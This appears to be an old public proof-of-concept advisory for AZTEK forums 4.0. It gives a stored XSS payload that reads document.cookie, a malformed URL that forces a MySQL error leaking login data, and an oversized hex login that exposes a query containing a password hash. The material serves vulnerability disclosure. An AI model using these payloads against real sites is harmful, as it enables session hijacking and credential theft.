@@ -1,0 +1,50 @@
+/*==========================================*/
+// AZTEK forums 4.0 multiple vulnerabilities (PoC)
+// Product: AZTEK forums
+// URL: http://www.forum-aztek.com/
+// RISK: high
+/*==========================================*/
+
+[PoC]
+
+1- XSS
+	- Post a message including the following line: </textarea>'"><script>alert(document.cookie)</script>
+	- Valid.
+	- Click on "Citer" to execute the script.
+
+	You can also do it with the edit button (after loging in).
+
+2-
+	Do the following request : http://SOME_HOST/forum/index.php?msg=*/*
+	It will dump a MySQL error message which can dump login:pw infos.
+
+3-
+	- Register with :
+	login : 6b 66 73 6a 64 61 20 54 50 68 70 45 72 72 6f 72 45 78 63 65
+	70 74 69 6f 6e 0d 0a 44 65 73 63 72 69 70 74 69 6f 6e 0d 0a 5b 57 61
+	72 6e 69 6e 67 5d 20 6d 79 73 71 6c 5f 63 6f 6e 6e 65 63 74 28 29 20
+	5b 3c 61 20 68 72 65 66 3d 27 66 75
+        [...a huge login name...]
+	6e 63 74 69 6f 6e 2e 6d 79 73 71 6c 2d 63 6f 6e 6e 65 63 74 27 3e 66
+	75 6e 63 74 69 6f 6e 2e 6d 79 73 71 6c 2d 63 6f 6e
+	passwd:blabla
+	email:blabla@gmail.com
+	- Valid.
+
+	This form is not validated at all, so it can cause a MySQL error like :
+
+	Mysql error in file 
+	/home/httpd/vhosts/www.**********.com/web/forum/index/actions.php in
+	function subscribe at line 222
+
+	Mysql query error :
+	INSERT INTO atk_users (login,owner,passwd,email,show_email,alert_mp,subscribe)
+		VALUES ('6b 66 73 6a 64 61 20 54 50 68 
+	[...]','admin','atHax4CLQE42Q','blabla@gmail.com','1','1','1141202540')
+
+	Please note this error and contact your administrator.
+
+--
+PoC by lorenzo [GHT], http://ght.c.la/
+
+# milw0rm.com [2006-03-02]
